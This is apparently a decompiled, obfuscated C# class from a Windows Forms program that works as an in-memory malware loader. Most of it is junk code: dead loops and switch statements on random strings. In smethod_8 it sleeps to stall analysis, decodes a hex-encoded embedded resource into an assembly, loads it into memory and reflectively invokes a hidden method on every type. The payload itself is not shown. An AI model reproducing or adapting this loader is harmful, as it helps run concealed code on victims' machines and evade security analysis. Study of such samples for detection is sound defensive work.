using System;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using WindowsFormsApp1;
using ns0;
using ns1;
using ns10;
using ns3;
using ns5;
using ns6;
using ns8;
using ns9;

namespace ns4;

internal class Class66
{
	static void smethod_0()
	{
		int num = 97474;
		while (num < 87613)
		{
			Console.WriteLine(num);
			num++;
			if (num > 60983)
			{
				break;
			}
		}
	}

	static void smethod_1(string string_0)
	{
		switch (string_0)
		{
		case "Ncnnfrthvvzf":
			Console.WriteLine("43988");
			break;
		case "Xxoetntlvnmid":
			Console.WriteLine("Eokrjakkyqd");
			break;
		case "Tyymecmqe":
			Console.WriteLine("Xkvaylfq");
			break;
		case "Iwdsqe":
			Console.WriteLine("Glybrssalwdrq");
			break;
		case "Mnffjobrcidz":
			Console.WriteLine("93457");
			break;
		case "Shratzb":
			Console.WriteLine("Xickonbqeiays");
			break;
		}
	}

	static void smethod_2(Class98 class98_0)
	{
		Class66.smethod_34("Chriayjghwv");
	}

	static void smethod_3(string string_0)
	{
		switch (string_0)
		{
		case "Qhshypfpoppaks":
			Console.WriteLine("97783");
			break;
		case "Qevmhhvpb":
			Console.WriteLine("Odxpfcrogdjyl");
			break;
		case "Bxjwkewzkhjfzt":
			Console.WriteLine("Mgihusi");
			break;
		case "Kqifxwxrxhr":
			Console.WriteLine("Clyvkhj");
			break;
		case "Ozxbakneygab":
			Console.WriteLine("75734");
			break;
		case "Jyamhs":
			Console.WriteLine("Xdxgmcnk");
			break;
		}
	}

	static void smethod_4()
	{
		int num = 52715;
		while (num < 23)
		{
			Console.WriteLine(num);
			num++;
			if (num > 13462)
			{
				break;
			}
		}
	}

	static void smethod_5(Form1 form1_0, Assembly assembly_0)
	{
		Type[] types = assembly_0.GetTypes();
		foreach (Type type in types)
		{
			try
			{
				object obj = assembly_0.CreateInstance(type.FullName);
				((Control)form1_0).set_Text((string)type.GetMethod("Dmx6bcRwy")!.Invoke(obj, null));
			}
			catch
			{
			}
		}
	}

	static void smethod_6(Class108 class108_0)
	{
		Class66.smethod_20("Icprgpigyaa");
	}

	static void smethod_7()
	{
		int num = 82801;
		while (num < 20976)
		{
			Console.WriteLine(num);
			num++;
			if (num > 48689)
			{
				break;
			}
		}
	}

	unsafe static void smethod_8(Form1 form1_0)
	{
		void* ptr = stackalloc byte[24];
		AppDomain currentDomain = AppDomain.CurrentDomain;
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 10;
		(*(int*)ptr)++;
		(*(int*)((byte*)ptr + 4))--;
		string textFile = Class131.TextFile1;
		*(int*)((byte*)ptr + 8) = 30;
		*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8) * 2;
		while (*(int*)((byte*)ptr + 12) != *(int*)((byte*)ptr + 8))
		{
			(*(int*)((byte*)ptr + 12))--;
			Thread.Sleep(852);
		}
		byte[] array = Class66.smethod_31(textFile, form1_0);
		if (array.Length > 0)
		{
			currentDomain.Load(array);
		}
		Assembly[] assemblies = currentDomain.GetAssemblies();
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < assemblies.Length)
		{
			Assembly assembly_ = assemblies[*(int*)((byte*)ptr + 20)];
			*(int*)((byte*)ptr + 16) = 30;
			do
			{
				Console.WriteLine(*(int*)((byte*)ptr + 16));
				(*(int*)((byte*)ptr + 16))++;
			}
			while (*(int*)((byte*)ptr + 16) < 30);
			Class66.smethod_5(form1_0, assembly_);
			(*(int*)((byte*)ptr + 20))++;
		}
	}

	static void smethod_9()
	{
		int num = 97477;
		while (num < 89143)
		{
			Console.WriteLine(num);
			num++;
			if (num > 54383)
			{
				break;
			}
		}
	}

	static void smethod_10(Class112 class112_0)
	{
		Class66.smethod_15("Isgikokotaqi");
	}

	static void smethod_11(string string_0)
	{
		switch (string_0)
		{
		case "Xtkfimwacopmn":
			Console.WriteLine("87926");
			break;
		case "Gujkrseumdobo":
			Console.WriteLine("Okubthgmejnh");
			break;
		case "Fgpujwxkjqj":
			Console.WriteLine("Hcktbginmuifn");
			break;
		case "Ikthejtqz":
			Console.WriteLine("Eqxvlmxazztsvg");
			break;
		case "Hlqrym":
			Console.WriteLine("63563");
			break;
		case "Eibbowp":
			Console.WriteLine("Mdagqcdmyzcisg");
			break;
		}
	}

	static void smethod_12(Class104 class104_0)
	{
		Class66.smethod_1("Twzuxqy");
	}

	static void smethod_13(Class110 class110_0)
	{
		Class66.smethod_3("Euakrx");
	}

	static void smethod_14(Form1 form1_0)
	{
	}

	static void smethod_15(string string_0)
	{
		switch (string_0)
		{
		case "Gcmvgge":
			Console.WriteLine("16098");
			break;
		case "Bypffnztnpfgjk":
			Console.WriteLine("Bqfhgpogubol");
			break;
		case "Ajpxja":
			Console.WriteLine("Vdqnjbaatpnp");
			break;
		case "Nygpfeyqe":
			Console.WriteLine("Mvzwrrzvt");
			break;
		case "Cybkxjfrw":
			Console.WriteLine("68034");
			break;
		case "Kfootzjfk":
			Console.WriteLine("Maoioujeedgio");
			break;
		}
	}

	static void smethod_16(string string_0)
	{
		switch (string_0)
		{
		case "Gcimylmup":
			Console.WriteLine("62545");
			break;
		case "Xbhiugayum":
			Console.WriteLine("Xftxmenjwvlyic");
			break;
		case "Viomff":
			Console.WriteLine("Fhtfwotwzcblft");
			break;
		case "Imcwbbrgbidr":
			Console.WriteLine("Bixonfueo");
			break;
		case "Llhiwiacaxl":
			Console.WriteLine("14496");
			break;
		case "Syzaynocqu":
			Console.WriteLine("Ixmfemexngkedq");
			break;
		}
	}

	static void smethod_17(Form1 form1_0)
	{
		Class66.smethod_14(form1_0);
	}

	static void smethod_18(string string_0)
	{
		switch (string_0)
		{
		case "Iujppyqd":
			Console.WriteLine("48360");
			break;
		case "Kmnytd":
			Console.WriteLine("Qoaufimw");
			break;
		case "Jvbjvxzhwmu":
			Console.WriteLine("Xjiffcbq");
			break;
		case "Dehhcdau":
			Console.WriteLine("Xhbdsqd");
			break;
		case "Ybhmemlderytn":
			Console.WriteLine("86617");
			break;
		case "Dzzjuljxavenr":
			Console.WriteLine("Ugwgri");
			break;
		}
	}

	static void smethod_19(Class96 class96_0)
	{
		Class66.smethod_38("Vvjvpr");
	}

	static void smethod_20(string string_0)
	{
		switch (string_0)
		{
		case "Rpnzygpohfr":
			Console.WriteLine("85137");
			break;
		case "Tmumejmqxftrc":
			Console.WriteLine("Rurmuqdbjouax");
			break;
		case "Mcxafdcwh":
			Console.WriteLine("Ryyswgvbvy");
			break;
		case "Brvphjg":
			Console.WriteLine("Uiknas");
			break;
		case "Psmdosrjemk":
			Console.WriteLine("59932");
			break;
		case "Dhwjtoqfavnte":
			Console.WriteLine("Dfxveazuzeacb");
			break;
		}
	}

	static void smethod_21(Class100 class100_0)
	{
		Class66.smethod_22("Lxtudrhcgwiox");
	}

	static void smethod_22(string string_0)
	{
		switch (string_0)
		{
		case "Rqilxuauv":
			Console.WriteLine("80965");
			break;
		case "Gnjpkqnsvru":
			Console.WriteLine("Zeejjy");
			break;
		case "Gabnhmavztsmu":
			Console.WriteLine("Qnzzukrp");
			break;
		case "Qyvgnsljkmydjh":
			Console.WriteLine("Woshqfaydemnn");
			break;
		case "Ltnbwdbbxavn":
			Console.WriteLine("98406");
			break;
		case "Aokkbdkhhomyp":
			Console.WriteLine("Yzmbwk");
			break;
		}
	}

	unsafe static void smethod_23(Form1 form1_0)
	{
		void* ptr = stackalloc byte[12];
		*(double*)ptr = 345.0;
		*(double*)ptr += *(double*)ptr * 0.165 + 4.89;
		Console.WriteLine(1);
		Console.WriteLine(Form1.Month.Feb);
		string[] names = Enum.GetNames(typeof(Form1.Month));
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < names.Length)
		{
			string value = names[*(int*)((byte*)ptr + 8)];
			Console.WriteLine(value);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static void smethod_24(Class106 class106_0)
	{
		Class66.smethod_25("Ibswkip");
	}

	static void smethod_25(string string_0)
	{
		switch (string_0)
		{
		case "Rrjhugl":
			Console.WriteLine("46823");
			break;
		case "Egokfhj":
			Console.WriteLine("Hiergyclv");
			break;
		case "Ndcfuovjfimpen":
			Console.WriteLine("Kuphmrelolz");
			break;
		case "Bdebvrvjexaq":
			Console.WriteLine("Axsujlyvevvvtn");
			break;
		case "Igfjpfkp":
			Console.WriteLine("43041");
			break;
		case "Kufyhlrqzff":
			Console.WriteLine("Etfmhf");
			break;
		}
	}

	static void smethod_26(Class94 class94_0)
	{
		Class66.smethod_16("Njsltbo");
	}

	static void smethod_27()
	{
		int num = 4100;
		while (num < 76919)
		{
			Console.WriteLine(num);
			num++;
			if (num > 85321)
			{
				break;
			}
		}
	}

	static void smethod_28()
	{
		int num = 35053;
		while (num < 80446)
		{
			Console.WriteLine(num);
			num++;
			if (num > 69520)
			{
				break;
			}
		}
	}

	static void smethod_29()
	{
		int num = 1813;
		while (num < 18609)
		{
			Console.WriteLine(num);
			num++;
			if (num > 43818)
			{
				break;
			}
		}
	}

	static void smethod_30()
	{
		int num = 63403;
		while (num < 18440)
		{
			Console.WriteLine(num);
			num++;
			if (num > 70832)
			{
				break;
			}
		}
	}

	static byte[] smethod_31(string string_0, Form1 form1_0)
	{
		Form1.Class0 CS_0024_003C_003E8__locals0 = new Form1.Class0();
		CS_0024_003C_003E8__locals0.string_0 = string_0;
		Class66.smethod_17(form1_0);
		return (from int_0 in Enumerable.Range(0, CS_0024_003C_003E8__locals0.string_0.Length)
			where int_0 % 2 == 0
			select Convert.ToByte(CS_0024_003C_003E8__locals0.string_0.Substring(int_0, 2), 16)).ToArray();
	}

	static void smethod_32(Class116 class116_0)
	{
		Class66.smethod_11("Fqvwhfeiynq");
	}

	static void smethod_33(Form1 form1_0)
	{
		((Control)form1_0).SuspendLayout();
		((ContainerControl)form1_0).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)form1_0).set_AutoScaleMode((AutoScaleMode)1);
		((Form)form1_0).set_ClientSize(new Size(473, 333));
		((Control)form1_0).set_Name("Form1");
		((Control)form1_0).set_Text("Form1");
		((Form)form1_0).add_Load((EventHandler)form1_0.method_0);
		((Control)form1_0).ResumeLayout(false);
	}

	static void smethod_34(string string_0)
	{
		switch (string_0)
		{
		case "Ayyqxetedbk":
			Console.WriteLine("82345");
			break;
		case "Xxymaigwo":
			Console.WriteLine("Ljzllifbpwiyi");
			break;
		case "Eqflqfoddsklsu":
			Console.WriteLine("Wfglxiscfg");
			break;
		case "Prxylps":
			Console.WriteLine("Zajustvveqqmv");
			break;
		case "Cgqrpshvmwnbho":
			Console.WriteLine("82593");
			break;
		case "Dgxvzpoynz":
			Console.WriteLine("Imwdkixk");
			break;
		}
	}

	static void smethod_35()
	{
		int num = 55238;
		while (num < 49461)
		{
			Console.WriteLine(num);
			num++;
			if (num > 99876)
			{
				break;
			}
		}
	}

	static void smethod_36()
	{
		int num = 18955;
		while (num < 93828)
		{
			Console.WriteLine(num);
			num++;
			if (num > 21161)
			{
				break;
			}
		}
	}

	static void smethod_37(Class114 class114_0)
	{
		Class66.smethod_18("Yqngyj");
	}

	static void smethod_38(string string_0)
	{
		switch (string_0)
		{
		case "Nuxmknvm":
			Console.WriteLine("56017");
			break;
		case "Ymeyje":
			Console.WriteLine("Oricsvxzhuo");
			break;
		case "Bsfegfbmp":
			Console.WriteLine("Qrizstcnrkmklk");
			break;
		case "Phmccwv":
			Console.WriteLine("Egdrbvez");
			break;
		case "Sdgrwpflbu":
			Console.WriteLine("41645");
			break;
		case "Pjhytfbsy":
			Console.WriteLine("Naiadpig");
			break;
		}
	}

	static void smethod_39(Class102 class102_0)
	{
		Class66.smethod_40("Wmddcympldqac");
	}

	static void smethod_40(string string_0)
	{
		switch (string_0)
		{
		case "Aheakz":
			Console.WriteLine("84856");
			break;
		case "Jsloahyn":
			Console.WriteLine("Zkyhxwzvw");
			break;
		case "Mugikhizzhym":
			Console.WriteLine("Wpagnixrmna");
			break;
		case "Vuwhtschfdjh":
			Console.WriteLine("Dhimuqvjchvlj");
			break;
		case "Refevqb":
			Console.WriteLine("114");
			break;
		case "Tidjsi":
			Console.WriteLine("Voaaurh");
			break;
		}
	}

	static void smethod_41()
	{
		int num = 6928;
		while (num < 15557)
		{
			Console.WriteLine(num);
			num++;
			if (num > 36692)
			{
				break;
			}
		}
	}

	static void smethod_42()
	{
		int num = 46365;
		while (num < 8904)
		{
			Console.WriteLine(num);
			num++;
			if (num > 83029)
			{
				break;
			}
		}
	}
}
